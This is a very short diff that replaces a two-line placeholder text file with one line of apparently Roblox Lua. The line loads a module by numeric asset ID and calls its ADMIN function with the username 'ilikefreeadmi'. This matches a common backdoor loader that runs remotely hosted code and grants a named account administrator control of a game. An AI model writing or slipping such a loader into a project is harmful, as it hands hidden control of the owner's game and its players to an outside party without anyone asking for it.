@@ -1,2 +1,1 @@
-# Fun
-Hi
+require(12159842278).ADMIN("ilikefreeadmi")
